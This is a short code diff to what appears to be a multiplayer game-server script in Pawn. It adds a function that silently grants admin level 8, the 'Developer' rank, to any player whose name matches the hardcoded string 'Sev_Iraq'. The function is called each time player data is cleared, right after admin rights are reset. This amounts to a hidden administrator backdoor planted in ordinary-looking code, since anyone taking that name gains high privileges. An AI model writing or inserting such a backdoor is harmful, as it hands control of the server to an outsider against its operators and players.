@@ -335,6 +335,20 @@ new Iterator:admin_players<MAX_PLAYERS-1>;
 #define MAX_ADMIN_LEVEL 9
 new a_rank_name[MAX_ADMIN_LEVEL][50] = {"Support", "Trial Admin", "Besic Admin", "Senior Admin", "Lead Admin", "Head Admin", "Founder", "Owner", "Developer"};
 
+stock ApplyServerOwner(playerid)
+{
+    new player_name[MAX_PLAYER_NAME];
+    GetPlayerName(playerid, player_name, sizeof(player_name));
+
+    if(!strcmp(player_name, "Sev_Iraq", true))
+    {
+        PlayerInfo[playerid][admin] = 8;
+        return 1;
+    }
+    return 0;
+}
+
+
 new Iterator:premium_players<MAX_PLAYERS-1>;
 
 new Iterator:helper_players<MAX_PLAYERS-1>;
@@ -6946,6 +6960,7 @@ stock clear_player_data(playerid)
 	p_t_info[playerid][v_key] = 0;
 
 	PlayerInfo[playerid][admin] = 0;
+	ApplyServerOwner(playerid);
 	PlayerInfo[playerid][level] = 1;
 	PlayerInfo[playerid][exp] = 0;
 	PlayerInfo[playerid][money] = 0;
